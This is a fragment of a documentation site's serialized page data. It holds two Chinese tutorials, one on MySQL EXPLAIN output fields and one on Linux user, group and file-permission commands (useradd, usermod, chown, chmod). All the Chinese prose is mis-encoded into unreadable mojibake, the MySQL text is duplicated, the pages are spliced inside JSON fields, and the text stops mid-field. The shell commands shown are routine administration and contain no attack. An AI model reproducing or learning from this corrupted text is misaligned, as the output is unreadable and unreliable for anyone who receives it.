ä¼çæå¦ä¸ SQL åæç»æï¼ä¸é¢è¯¦ç»å¯¹æ¯ä¸ªå­æ®µè¿è¡è¯¦è§£\n\n\n\n\n# id\n\næ¯ä¸ç»æ°å­ï¼ä»£è¡¨å¤ä¸ªè¡¨ä¹é´çæ¥è¯¢é¡ºåºï¼æèåå«å­å¥æ¥è¯¢è¯­å¥ä¸­çé¡ºåºï¼id æ»å±åä¸ºä¸ç§æåµï¼ä¾æ¬¡è¯¦è§£\n\nid ç¸åï¼æ§è¡é¡ºåºç±ä¸è³ä¸\nid ä¸åï¼å¦ææ¯å­æ¥è¯¢ï¼id å·ä¼éå¢ï¼id å¼è¶å¤§ä¼åçº§è¶é«ï¼è¶åè¢«æ§è¡\nid ç¸ååä¸åçæåµåæ¶å­å¨\n\n\n# select_type\n\nselect_type åå«ä»¥ä¸å ç§å¼ï¼\n\n * simple\n   ç®åç select æ¥è¯¢ï¼æ¥è¯¢ä¸­ä¸åå«å­æ¥è¯¢æè union æ¥è¯¢\n\n\n\n * primary\n   å¦æ SQL è¯­å¥ä¸­åå«ä»»ä½å­æ¥è¯¢ï¼é£ä¹å­æ¥è¯¢çæå¤å±ä¼è¢«æ è®°ä¸º primary\n\n\n\n * subquery\n   å¨ select æè where éåå«äºå­æ¥è¯¢ï¼é£ä¹å­æ¥è¯¢å°±ä¼è¢«æ è®°ä¸º subQqueryï¼åä¸ãäºåæ¶åºç°\n\n\n\n * derived\n   å¨ from ä¸­åå«çå­æ¥è¯¢ï¼ä¼è¢«æ è®°ä¸ºè¡çæ¥è¯¢ï¼ä¼ææ¥è¯¢ç»ææ¾å°ä¸ä¸ªä¸´æ¶è¡¨ä¸­\n\n\n\n * union / union result\n   å¦ææä¸¤ä¸ª select æ¥è¯¢è¯­å¥ï¼ä»ä»¬ä¹é´ç¨ union è¿èµ·æ¥æ¥è¯¢ï¼é£ä¹ç¬¬äºä¸ª select ä¼è¢«æ è®°ä¸º unionï¼union çç»æè¢«æ è®°ä¸º union resultãå®ç id æ¯ä¸º null ç\n\n\n\n\n# table\n\nè¡¨ç¤ºè¿ä¸è¡çæ°æ®æ¯åªå¼ è¡¨çæ°æ®\n\n\n# type\n\ntype æ¯ä»£è¡¨ MySQL ä½¿ç¨äºåªç§ç´¢å¼ç±»åï¼ä¸åçç´¢å¼ç±»åçæ¥è¯¢æçä¹æ¯ä¸ä¸æ ·çï¼å¸¸ç¨çç±»åæï¼ ALLãindexãrangeã refãeq_refãconstãsystemãNULLï¼ä»ä¸å°ä¸ï¼æ§è½ä»å·®å°å¥½ï¼\n\n * ALL\n   Full Table Scanï¼ MySQL å°éåå¨è¡¨ä»¥æ¾å°å¹éçè¡\n * index\n   Full Index Scanï¼index ä¸ ALL åºå«ä¸º index ç±»ååªéåç´¢å¼æ \n * range\n   åªæ£ç´¢ç»å®èå´çè¡ï¼ä½¿ç¨ä¸ä¸ªç´¢å¼æ¥éæ©è¡\n * ref\n   è¡¨ç¤ºä¸è¿°è¡¨çè¿æ¥å¹éæ¡ä»¶ï¼å³åªäºåæå¸¸éè¢«ç¨äºæ¥æ¾ç´¢å¼åä¸çå¼\n * eq_ref\n   ç±»ä¼¼ refï¼åºå«å°±å¨ä½¿ç¨çç´¢å¼æ¯å¯ä¸ç´¢å¼ï¼å¯¹äºæ¯ä¸ªç´¢å¼é®å¼ï¼è¡¨ä¸­åªæä¸æ¡è®°å½å¹éï¼ç®åæ¥è¯´ï¼å°±æ¯å¤è¡¨è¿æ¥ä¸­ä½¿ç¨ primary key æè unique key ä½ä¸ºå³èæ¡ä»¶\n * constãsystem\n   å½ MySQL å¯¹æ¥è¯¢æé¨åè¿è¡ä¼åï¼å¹¶è½¬æ¢ä¸ºä¸ä¸ªå¸¸éæ¶ï¼ä½¿ç¨è¿äºç±»åè®¿é®ãå¦å°ä¸»é®ç½®äº where åè¡¨ä¸­ï¼MySQL å°±è½å°è¯¥æ¥è¯¢è½¬æ¢ä¸ºä¸ä¸ªå¸¸éï¼system æ¯ const ç±»åçç¹ä¾ï¼å½æ¥è¯¢çè¡¨åªæä¸è¡çæåµä¸ï¼ä½¿ç¨ system\n * NULL\n   MySQL å¨ä¼åè¿ç¨ä¸­åè§£è¯­å¥ï¼æ§è¡æ¶çè³ä¸ç¨è®¿é®è¡¨æç´¢å¼ï¼ä¾å¦ä»ä¸ä¸ªç´¢å¼åééåæå°å¼å¯ä»¥éè¿åç¬ç´¢å¼æ¥æ¾å®æã\n\n\n# possible_keys\n\næ­¤æ¬¡æ¥è¯¢ä¸­æ¶åå­æ®µä¸è¥å­å¨ç´¢å¼ï¼åä¼è¢«ååºæ¥ï¼è¡¨ç¤ºå¯è½ä¼ç¨å°çç´¢å¼ï¼ä½å¹¶ä¸æ¯å®éä¸ä¸å®ä¼ç¨å°çç´¢å¼\n\n\n# Key\n\nkey åæ¾ç¤º MySQL å®éå³å®ä½¿ç¨çé®ï¼ç´¢å¼ï¼ï¼å¿ç¶åå«å¨ possible_keys ä¸­\nå¦ææ²¡æéæ©ç´¢å¼ï¼é®æ¯ NULLãè¦æ³å¼ºå¶ MySQL ä½¿ç¨æå¿½è§ possible_keys åä¸­çç´¢å¼ï¼å¨æ¥è¯¢ä¸­ä½¿ç¨ FORCE INDEXãUSE INDEX æè IGNORE INDEXã\n\n\n# key_len\n\nè¡¨ç¤ºç´¢å¼ä¸­ä½¿ç¨çå­èæ°ï¼éè¿è¯¥å±æ§å¯ä»¥ç¥éå¨æ¥è¯¢ä¸­ä½¿ç¨çç´¢å¼é¿åº¦ï¼æ³¨æï¼è¿ä¸ªé¿åº¦æ¯æå¤§å¯è½é¿åº¦ï¼å¹¶éå®éä½¿ç¨é¿åº¦ï¼å¨ä¸æå¤±ç²¾ç¡®æ§çæåµä¸ï¼é¿åº¦è¶ç­æ¥è¯¢æçè¶é«\n\n\n# ref\n\næ¾ç¤ºå³èçå­æ®µãå¦æä½¿ç¨å¸¸æ°ç­å¼æ¥è¯¢ï¼åæ¾ç¤º constï¼å¦ææ¯è¿æ¥æ¥è¯¢ï¼åä¼æ¾ç¤ºå³èçå­æ®µã\n\n\n\n * tb_emp è¡¨ä¸ºéå¯ä¸æ§ç´¢å¼æ«æï¼å®éä½¿ç¨çç´¢å¼åä¸º idx_nameï¼ç±äº tb_emp.name='rose' ä¸ºä¸ä¸ªå¸¸éï¼æä»¥ ref=constã\n * tb_dept ä¸ºå¯ä¸ç´¢å¼æ«æï¼ä» sql è¯­å¥å¯ä»¥çåºï¼å®éä½¿ç¨äº PRIMARY ä¸»é®ç´¢å¼ï¼ref=db01.tb_emp.deptid è¡¨ç¤ºå³èäº db01 æ°æ®åºä¸­ tb_emp è¡¨ç deptid å­æ®µã\n\n\n# rows\n\næ ¹æ®è¡¨ä¿¡æ¯ç»è®¡ä»¥åç´¢å¼çä½¿ç¨æåµï¼å¤§è´ä¼°ç®è¯´è¦æ¾å°æéè®°å½éè¦è¯»åçè¡æ°ï¼rows è¶å°è¶å¥½\n\n\n# extra\n\nä¸éåå¨å¶ä»åæ¾ç¤ºåºæ¥ï¼ä½å¨ä¼åæ¶ååéè¦çä¿¡æ¯\n\n\n# using fileSortï¼éç¹ä¼åï¼\n\nä¿ç§° \"æä»¶æåº\" ï¼å¨æ°æ®éå¤§çæ¶åå ä¹æ¯ âä¹æ­»ä¸çâï¼å¨ order by æèå¨ group by æåºçè¿ç¨ä¸­ï¼order by çå­æ®µä¸æ¯ç´¢å¼å­æ®µï¼æè select æ¥è¯¢å­æ®µå­å¨ä¸æ¯ç´¢å¼å­æ®µï¼æè select æ¥è¯¢å­æ®µé½æ¯ç´¢å¼å­æ®µï¼ä½æ¯ order by å­æ®µå select ç´¢å¼å­æ®µçé¡ºåºä¸ä¸è´ï¼é½ä¼å¯¼è´ fileSort\n\n\n\n\n# using temporaryï¼éç¹ä¼åï¼\n\nä½¿ç¨äºä¸´æ¶è¡¨ä¿å­ä¸­é´ç»æï¼å¸¸è§äº order by å group by ä¸­ã\n\n\n\n\n# USING indexï¼éç¹ï¼\n\nè¡¨ç¤ºç¸åºç select æä½ä¸­ä½¿ç¨äºè¦çç´¢å¼ï¼Coveing Indexï¼, é¿åè®¿é®äºè¡¨çæ°æ®è¡ï¼æçä¸éï¼ å¦æåæ¶åºç° using whereï¼è¡¨æç´¢å¼è¢«ç¨æ¥æ§è¡ç´¢å¼é®å¼çæ¥æ¾ï¼å¦ææ²¡æåæ¶åºç° using whereï¼è¡¨é¢ç´¢å¼ç¨æ¥è¯»åæ°æ®èéæ§è¡æ¥æ¾å¨ä½ã\n\n\n\n\n# Using wher\n\nè¡¨æä½¿ç¨äº where è¿æ»¤\n\n\n# using join buffer\n\nä½¿ç¨äºè¿æ¥ç¼å­\n\n\n# impossible where\n\nwhere å­å¥çå¼æ»æ¯ falseï¼ä¸è½ç¨æ¥è·åä»»ä½åç»\n\n\n# select tables optimized away\n\nå¨æ²¡æ GROUPBY å­å¥çæåµä¸ï¼åºäºç´¢å¼ä¼å MIN/MAX æä½æè å¯¹äº MyISAM å­å¨å¼æä¼å COUNT (*) æä½ï¼ä¸å¿ç­å°æ§è¡é¶æ®µåè¿è¡è®¡ç®ï¼ æ¥è¯¢æ§è¡è®¡åçæçé¶æ®µå³å®æä¼åã\n\n\n# distinct\n\nä¼å distinctï¼å¨æ¾å°ç¬¬ä¸å¹éçåç»åå³åæ­¢æ¾åæ ·å¼çå·¥ä½",normalizedContent:"# explain ç¨æ³\n\næ¨¡æ mysql ä¼åå¨æ¯å¦ä½æ§è¡ sql æ¥è¯¢è¯­å¥çï¼ä»èç¥é mysql æ¯å¦ä½å¤çä½ ç sql è¯­å¥çãåæä½ çæ¥è¯¢è¯­å¥ææ¯è¡¨ç»æçæ§è½ç¶é¢ã\nè¯­æ³ï¼explain + sql è¯­å¥ï¼\nå¦ï¼explain select * from user; ä¼çæå¦ä¸ sql åæç»æï¼ä¸é¢è¯¦ç»å¯¹æ¯ä¸ªå­æ®µè¿è¡è¯¦è§£\n\n\n\n\n# id\n\næ¯ä¸ç»æ°å­ï¼ä»£è¡¨å¤ä¸ªè¡¨ä¹é´çæ¥è¯¢é¡ºåºï¼æèåå«å­å¥æ¥è¯¢è¯­å¥ä¸­çé¡ºåºï¼id æ»å±åä¸ºä¸ç§æåµï¼ä¾æ¬¡è¯¦è§£\n\nid ç¸åï¼æ§è¡é¡ºåºç±ä¸è³ä¸\nid ä¸åï¼å¦ææ¯å­æ¥è¯¢ï¼id å·ä¼éå¢ï¼id å¼è¶å¤§ä¼åçº§è¶é«ï¼è¶åè¢«æ§è¡\nid ç¸ååä¸åçæåµåæ¶å­å¨\n\n\n# select_type\n\nselect_type åå«ä»¥ä¸å ç§å¼ï¼\n\n * simple\n   ç®åç select æ¥è¯¢ï¼æ¥è¯¢ä¸­ä¸åå«å­æ¥è¯¢æè union æ¥è¯¢\n\n\n\n * primary\n   å¦æ sql è¯­å¥ä¸­åå«ä»»ä½å­æ¥è¯¢ï¼é£ä¹å­æ¥è¯¢çæå¤å±ä¼è¢«æ è®°ä¸º primary\n\n\n\n * subquery\n   å¨ select æè where éåå«äºå­æ¥è¯¢ï¼é£ä¹å­æ¥è¯¢å°±ä¼è¢«æ è®°ä¸º subqqueryï¼åä¸ãäºåæ¶åºç°\n\n\n\n * derived\n   å¨ from ä¸­åå«çå­æ¥è¯¢ï¼ä¼è¢«æ è®°ä¸ºè¡çæ¥è¯¢ï¼ä¼ææ¥è¯¢ç»ææ¾å°ä¸ä¸ªä¸´æ¶è¡¨ä¸­\n\n\n\n * union / union result\n   å¦ææä¸¤ä¸ª select æ¥è¯¢è¯­å¥ï¼ä»ä»¬ä¹é´ç¨ union è¿èµ·æ¥æ¥è¯¢ï¼é£ä¹ç¬¬äºä¸ª select ä¼è¢«æ è®°ä¸º unionï¼union çç»æè¢«æ è®°ä¸º union resultãå®ç id æ¯ä¸º null ç\n\n\n\n\n# table\n\nè¡¨ç¤ºè¿ä¸è¡çæ°æ®æ¯åªå¼ è¡¨çæ°æ®\n\n\n# type\n\ntype æ¯ä»£è¡¨ mysql ä½¿ç¨äºåªç§ç´¢å¼ç±»åï¼ä¸åçç´¢å¼ç±»åçæ¥è¯¢æçä¹æ¯ä¸ä¸æ ·çï¼å¸¸ç¨çç±»åæï¼ allãindexãrangeã refãeq_refãconstãsystemãnullï¼ä»ä¸å°ä¸ï¼æ§è½ä»å·®å°å¥½ï¼\n\n * all\n   full table scanï¼ mysql å°éåå¨è¡¨ä»¥æ¾å°å¹éçè¡\n * index\n   full index scanï¼index ä¸ all åºå«ä¸º index ç±»ååªéåç´¢å¼æ \n * range\n   åªæ£ç´¢ç»å®èå´çè¡ï¼ä½¿ç¨ä¸ä¸ªç´¢å¼æ¥éæ©è¡\n * ref\n   è¡¨ç¤ºä¸è¿°è¡¨çè¿æ¥å¹éæ¡ä»¶ï¼å³åªäºåæå¸¸éè¢«ç¨äºæ¥æ¾ç´¢å¼åä¸çå¼\n * eq_ref\n   ç±»ä¼¼ refï¼åºå«å°±å¨ä½¿ç¨çç´¢å¼æ¯å¯ä¸ç´¢å¼ï¼å¯¹äºæ¯ä¸ªç´¢å¼é®å¼ï¼è¡¨ä¸­åªæä¸æ¡è®°å½å¹éï¼ç®åæ¥è¯´ï¼å°±æ¯å¤è¡¨è¿æ¥ä¸­ä½¿ç¨ primary key æè unique key ä½ä¸ºå³èæ¡ä»¶\n * constãsystem\n   å½ mysql å¯¹æ¥è¯¢æé¨åè¿è¡ä¼åï¼å¹¶è½¬æ¢ä¸ºä¸ä¸ªå¸¸éæ¶ï¼ä½¿ç¨è¿äºç±»åè®¿é®ãå¦å°ä¸»é®ç½®äº where åè¡¨ä¸­ï¼mysql å°±è½å°è¯¥æ¥è¯¢è½¬æ¢ä¸ºä¸ä¸ªå¸¸éï¼system æ¯ const ç±»åçç¹ä¾ï¼å½æ¥è¯¢çè¡¨åªæä¸è¡çæåµä¸ï¼ä½¿ç¨ system\n * null\n   mysql å¨ä¼åè¿ç¨ä¸­åè§£è¯­å¥ï¼æ§è¡æ¶çè³ä¸ç¨è®¿é®è¡¨æç´¢å¼ï¼ä¾å¦ä»ä¸ä¸ªç´¢å¼åééåæå°å¼å¯ä»¥éè¿åç¬ç´¢å¼æ¥æ¾å®æã\n\n\n# possible_keys\n\næ­¤æ¬¡æ¥è¯¢ä¸­æ¶åå­æ®µä¸è¥å­å¨ç´¢å¼ï¼åä¼è¢«ååºæ¥ï¼è¡¨ç¤ºå¯è½ä¼ç¨å°çç´¢å¼ï¼ä½å¹¶ä¸æ¯å®éä¸ä¸å®ä¼ç¨å°çç´¢å¼\n\n\n# key\n\nkey åæ¾ç¤º mysql å®éå³å®ä½¿ç¨çé®ï¼ç´¢å¼ï¼ï¼å¿ç¶åå«å¨ possible_keys ä¸­\nå¦ææ²¡æéæ©ç´¢å¼ï¼é®æ¯ nullãè¦æ³å¼ºå¶ mysql ä½¿ç¨æå¿½è§ possible_keys åä¸­çç´¢å¼ï¼å¨æ¥è¯¢ä¸­ä½¿ç¨ force indexãuse index æè ignore indexã\n\n\n# key_len\n\nè¡¨ç¤ºç´¢å¼ä¸­ä½¿ç¨çå­èæ°ï¼éè¿è¯¥å±æ§å¯ä»¥ç¥éå¨æ¥è¯¢ä¸­ä½¿ç¨çç´¢å¼é¿åº¦ï¼æ³¨æï¼è¿ä¸ªé¿åº¦æ¯æå¤§å¯è½é¿åº¦ï¼å¹¶éå®éä½¿ç¨é¿åº¦ï¼å¨ä¸æå¤±ç²¾ç¡®æ§çæåµä¸ï¼é¿åº¦è¶ç­æ¥è¯¢æçè¶é«\n\n\n# ref\n\næ¾ç¤ºå³èçå­æ®µãå¦æä½¿ç¨å¸¸æ°ç­å¼æ¥è¯¢ï¼åæ¾ç¤º constï¼å¦ææ¯è¿æ¥æ¥è¯¢ï¼åä¼æ¾ç¤ºå³èçå­æ®µã\n\n\n\n * tb_emp è¡¨ä¸ºéå¯ä¸æ§ç´¢å¼æ«æï¼å®éä½¿ç¨çç´¢å¼åä¸º idx_nameï¼ç±äº tb_emp.name='rose' ä¸ºä¸ä¸ªå¸¸éï¼æä»¥ ref=constã\n * tb_dept ä¸ºå¯ä¸ç´¢å¼æ«æï¼ä» sql è¯­å¥å¯ä»¥çåºï¼å®éä½¿ç¨äº primary ä¸»é®ç´¢å¼ï¼ref=db01.tb_emp.deptid è¡¨ç¤ºå³èäº db01 æ°æ®åºä¸­ tb_emp è¡¨ç deptid å­æ®µã\n\n\n# rows\n\næ ¹æ®è¡¨ä¿¡æ¯ç»è®¡ä»¥åç´¢å¼çä½¿ç¨æåµï¼å¤§è´ä¼°ç®è¯´è¦æ¾å°æéè®°å½éè¦è¯»åçè¡æ°ï¼rows è¶å°è¶å¥½\n\n\n# extra\n\nä¸éåå¨å¶ä»åæ¾ç¤ºåºæ¥ï¼ä½å¨ä¼åæ¶ååéè¦çä¿¡æ¯\n\n\n# using filesortï¼éç¹ä¼åï¼\n\nä¿ç§° \"æä»¶æåº\" ï¼å¨æ°æ®éå¤§çæ¶åå ä¹æ¯ âä¹æ­»ä¸çâï¼å¨ order by æèå¨ group by æåºçè¿ç¨ä¸­ï¼order by çå­æ®µä¸æ¯ç´¢å¼å­æ®µï¼æè select æ¥è¯¢å­æ®µå­å¨ä¸æ¯ç´¢å¼å­æ®µï¼æè select æ¥è¯¢å­æ®µé½æ¯ç´¢å¼å­æ®µï¼ä½æ¯ order by å­æ®µå select ç´¢å¼å­æ®µçé¡ºåºä¸ä¸è´ï¼é½ä¼å¯¼è´ filesort\n\n\n\n\n# using temporaryï¼éç¹ä¼åï¼\n\nä½¿ç¨äºä¸´æ¶è¡¨ä¿å­ä¸­é´ç»æï¼å¸¸è§äº order by å group by ä¸­ã\n\n\n\n\n# using indexï¼éç¹ï¼\n\nè¡¨ç¤ºç¸åºç select æä½ä¸­ä½¿ç¨äºè¦çç´¢å¼ï¼coveing indexï¼, é¿åè®¿é®äºè¡¨çæ°æ®è¡ï¼æçä¸éï¼ å¦æåæ¶åºç° using whereï¼è¡¨æç´¢å¼è¢«ç¨æ¥æ§è¡ç´¢å¼é®å¼çæ¥æ¾ï¼å¦ææ²¡æåæ¶åºç° using whereï¼è¡¨é¢ç´¢å¼ç¨æ¥è¯»åæ°æ®èéæ§è¡æ¥æ¾å¨ä½ã\n\n\n\n\n# using wher\n\nè¡¨æä½¿ç¨äº where è¿æ»¤\n\n\n# using join buffer\n\nä½¿ç¨äºè¿æ¥ç¼å­\n\n\n# impossible where\n\nwhere å­å¥çå¼æ»æ¯ falseï¼ä¸è½ç¨æ¥è·åä»»ä½åç»\n\n\n# select tables optimized away\n\nå¨æ²¡æ groupby å­å¥çæåµä¸ï¼åºäºç´¢å¼ä¼å min/max æä½æè å¯¹äº myisam å­å¨å¼æä¼å count (*) æä½ï¼ä¸å¿ç­å°æ§è¡é¶æ®µåè¿è¡è®¡ç®ï¼ æ¥è¯¢æ§è¡è®¡åçæçé¶æ®µå³å®æä¼åã\n\n\n# distinct\n\nä¼å distinctï¼å¨æ¾å°ç¬¬ä¸å¹éçåç»åå³åæ­¢æ¾åæ ·å¼çå·¥ä½",charsets:{cjk:!0}},{title:"linux åå»ºç¨æ·åæéæä½",frontmatter:{title:"linux åå»ºç¨æ·åæéæä½",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2300",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2300.Linux%20%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%E5%8F%8A%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C.html",relativePath:"04.è¿ç»´/2300.linux/2300.Linux åå»ºç¨æ·åæéæä½.md",key:"v-066dd738",path:"/linux/2300/",headers:[{level:2,title:"ç¨æ·",slug:"ç¨æ·",normalizedTitle:"ç¨æ·",charIndex:2},{level:3,title:"usermod",slug:"usermod",normalizedTitle:"usermod",charIndex:512},{level:2,title:"ç¨æ·ç» group",slug:"ç¨æ·ç»-group",normalizedTitle:"ç¨æ·ç» group",charIndex:1095},{level:2,title:"æä»¶æé chown",slug:"æä»¶æé-chown",normalizedTitle:"æä»¶æé chown",charIndex:1635},{level:2,title:"chmod",slug:"chmod",normalizedTitle:"chmod",charIndex:2059}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"ç¨æ· usermod ç¨æ·ç» group æä»¶æé chown chmod",content:'# ç¨æ·\n\nå³äº useradd çæäºåæ°ï¼\n\n * -u UIDï¼æå® UIDï¼è¿ä¸ª UID å¿é¡»æ¯å¤§äºç­äº 500ï¼å¹¶æ²¡æå¶ä»ç¨æ·å ç¨ç UID\n * -g GID/GROUPNAMEï¼æå®é»è®¤ç»ï¼å¯ä»¥æ¯ GID æè GROUPNAMEï¼åæ ·ä¹å¿é¡»çå®å­å¨\n * -G GROUPSï¼æå®éå ç»\n * -c COMMENTï¼æå®ç¨æ·çæ³¨éä¿¡æ¯\n * -d PATHï¼æå®ç¨æ·çå®¶ç®å½\n\n> -g åºæ¬ç»ï¼å¦ææ²¡ææå®ç¨æ·ç»ï¼åå»ºç¨æ·çæ¶åç³»ç»ä¼é»è®¤åæ¶åå»ºä¸ä¸ªåè¿ä¸ªç¨æ·åååçç»ï¼è¿ä¸ªç»å°±æ¯åºæ¬ç»ï¼ä¸å¯ä»¥æç¨æ·ä»åºæ¬ç»ä¸­å é¤ãå¨åå»ºæä»¶æ¶ï¼æä»¶çæå±ç»å°±æ¯ç¨æ·çåºæ¬ç»ã\n> -G éå ç»ï¼é¤äºåºæ¬ç»ä¹å¤ï¼ç¨æ·æå¨çå¶ä»ç»ï¼é½æ¯éå ç»ãç¨æ·æ¯å¯ä»¥ä»éå ç»ä¸­è¢«å é¤çã\n> ç¨æ·ä¸è®ºä¸ºä¸åºæ¬ç»ä¸­è¿æ¯éå ç»ä¸­ï¼å°±ä¼æ¥æè¯¥ç»çæéãä¸ä¸ªç¨æ·å¯ä»¥å±äºå¤ä¸ªéå ç»ãä½æ¯ä¸ä¸ªç¨æ·åªè½æä¸ä¸ªåºæ¬ç»ã\n\næ¥çææç¨æ·\n\ncat /etc/passwd\n\n\n1\n\n\næ·»å \n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\nå é¤ç¨æ·åå³èçç®å½\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod å½ä»¤ç¨äºä¿®æ¹ç¨æ·å¸å·ã\n\n * -c <å¤æ³¨> ãä¿®æ¹ç¨æ·å¸å·çå¤æ³¨æå­ã\n * -d ç»å¥ç®å½ > ãä¿®æ¹ç¨æ·ç»å¥æ¶çç®å½ã\n * -e <æææé> ãä¿®æ¹å¸å·çæææéã\n * -f <ç¼å²å¤©æ°> ãä¿®æ¹å¨å¯ç è¿æåå¤å°å¤©å³å³é­è¯¥å¸å·ã\n * -g <ä¸»ç»> ãä¿®æ¹ç¨æ·æå±ä¸»ç»ã\n * -G <ç¾¤ç»> ãä¿®æ¹ç¨æ·æå±çéå ç¾¤ç»ã\n * -l <å¸å·åç§°> ãä¿®æ¹ç¨æ·å¸å·åç§°ã\n * -L éå®ç¨æ·å¯ç ï¼ä½¿å¯ç æ æã\n * -s ä¿®æ¹ç¨æ·ç»å¥åæä½¿ç¨ç shellã\n * -u ä¿®æ¹ç¨æ· IDã\n * -U è§£é¤å¯ç éå®ã\n * -a ä»£è¡¨ appendï¼ä¹å°±æ¯å°ç¨æ·æ·»å å°æ°ç¨æ·ç»ä¸­èä¸å¿ç¦»å¼åæçå¶ä»ç¨æ·ç»\n\nå° xulei æ·»å å° root ç»\n\nusermod -g root xulei\n\n\n1\n\n\nå¦ææ·»å çç¨æ·ä¸è½éè¿ ssh ç»å½ï¼å¯ä»¥æ¥çç¨æ·åå¦æ bash æé\n\n# æ¥çææç¨æ·ï¼å¯ä»¥æ¥çç¨æ·æ¯å¦æå¦ä¸è·¯å¾\ncat /etc/passwd\n# ä¿®æ¹ç¨æ·æ /bin/bash æé\nusermod -s /bin/bash ç¨æ·å\n# ç¦æ­¢ç¨æ·æ /bin/bash æ¹ä¸º /sbin/nologin\nusermod -s /sbin/nologin ç¨æ·å\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç¨æ·ç» group\n\nå³äºç»çå¢å åå é¤ä¿¡æ¯ä¼å¨ etc ç®å½ç group æä»¶ä¸­æ¾å°ï¼å½ä»¤ cat /etc/group å¯ä»¥çå°èªå·±çåç»ååç» idï¼0 è¡¨ç¤ºç®¡çåï¼rootï¼ï¼1 - 500 è¡¨ç¤ºç³»ç»ç¨æ·ã\n\ngroupadd å½ä»¤ è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n * -gï¼æå®æ°å»ºå·¥ä½ç»ç idï¼\n * -rï¼åå»ºç³»ç»å·¥ä½ç»ï¼ç³»ç»å·¥ä½ç»çç» ID å°äº 500ï¼\n * -Kï¼è¦çéç½®æä»¶ "/ect/login.defs"ï¼\n * -oï¼åè®¸æ·»å ç» ID å·ä¸å¯ä¸çå·¥ä½ç»ã\n * -f,--force: å¦ææå®çç»å·²ç»å­å¨ï¼æ­¤éé¡¹å°å¤±æäºä»ä»¥æåç¶æéåºãå½ä¸ -g ä¸èµ·ä½¿ç¨ï¼å¹¶ä¸æå®ç GID_MIN å·²ç»å­å¨æ¶ï¼éæ©å¦ä¸ä¸ªå¯ä¸ç GIDï¼å³ - g å³é­ï¼ã\n\næ¥çææç»\n\ncat /etc/group\n\n\n1\n\n\næ¥çå½åç»\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\næ¥çç¨æ·æå±ç»\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\nå é¤ç»\n\ngroupdel xulei\n\n\n1\n\n\næ·»å é¢å¤ç»\n\nusermod -a -G ç»åç§° ç¨æ·å\n\n\n1\n\n\n\n# æä»¶æé chown\n\nç¨æ¥æ´æ¹æä¸ªç®å½ææä»¶çç¨æ·ååç¨æ·ç»ã\n\n * user : æ°çæ¡£æ¡æ¥æèçä½¿ç¨è ID\n * group : æ°çæ¡£æ¡æ¥æèçä½¿ç¨èç¾¤ä½ (group)\n * -c : è¥è¯¥æ¡£æ¡æ¥æèç¡®å®å·²ç»æ´æ¹ï¼ææ¾ç¤ºå¶æ´æ¹å¨ä½\n * -f : è¥è¯¥æ¡£æ¡æ¥æèæ æ³è¢«æ´æ¹ä¹ä¸è¦æ¾ç¤ºéè¯¯è®¯æ¯\n * -h : åªå¯¹äºè¿ç» (link) è¿è¡åæ´ï¼èéè¯¥ link çæ­£æåçæ¡£æ¡\n * -v : æ¾ç¤ºæ¥æèåæ´çè¯¦ç»èµæ\n * -R : å¯¹ç®åç®å½ä¸çæææ¡£æ¡ä¸å­ç®å½è¿è¡ç¸åçæ¥æèåæ´ (å³ä»¥éåçæ¹å¼éä¸ªåæ´)\n * --help : æ¾ç¤ºè¾å©è¯´æ\n * --version : æ¾ç¤ºçæ¬\n\nä¿®æ¹ abc æä»¶çææè\n\nchown root abc\n\n\n1\n\n\næç®å½ /demo åå¶ä¸çæææä»¶åå­ç®å½çææäººæ¹æ rootï¼æå±ç»æ¹æ rootaã\n\nchown -R root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- ä¸å± 10 ä¸ªå­ç¬¦ï¼ä¸é¢è®²è§£ä¸ï¼\n\n * d è¡¨ç¤ºç®å½ï¼å¦ææ¯ - è¡¨ç¤ºæ¯ä¸ä¸ªæ®éæä»¶ãå©ä½ç 9 ä¸ªå­ç¬¦ï¼åæ 3 ç»ï¼æ¯ç» 3 ä¸ªå­ç¬¦ï¼åå«è¡¨ç¤º user/group/others ç rwx æéï¼\n * u user è¡¨ç¤ºæ¥æèï¼å¯ä»¥çå°æ¥æèæ¯ xulei ç¨æ·ï¼ä½æä»¶è¿å±äº root ç»ï¼å æ­¤ xulei è¿æ¯æ æ³æ§è¡è¯¥æä»¶ã\n * g group è¡¨ç¤ºç»ï¼é¤äº mysql è¿ä¸ªäººç åä¸ä¸ª MySQL ç»æ¥æçæå\n * o others å°±æ¯å¶ä»äººäºï¼å¥æéä¹æ²¡æã\n * a è¡¨ç¤º âææ (all) ç¨æ·âãå®æ¯ç³»ç»é»è®¤å¼ã\n\n[root@node102 sh]# chmod a+rwx checkLogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 Sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 Jan 19 17:31 checkLogin.sh\n-rwxr--r--. 1 root  root 123 Sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 Nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',normalizedContent:'# ç¨æ·\n\nå³äº useradd çæäºåæ°ï¼\n\n * -u uidï¼æå® uidï¼è¿ä¸ª uid å¿é¡»æ¯å¤§äºç­äº 500ï¼å¹¶æ²¡æå¶ä»ç¨æ·å ç¨ç uid\n * -g gid/groupnameï¼æå®é»è®¤ç»ï¼å¯ä»¥æ¯ gid æè groupnameï¼åæ ·ä¹å¿é¡»çå®å­å¨\n * -g groupsï¼æå®éå ç»\n * -c commentï¼æå®ç¨æ·çæ³¨éä¿¡æ¯\n * -d pathï¼æå®ç¨æ·çå®¶ç®å½\n\n> -g 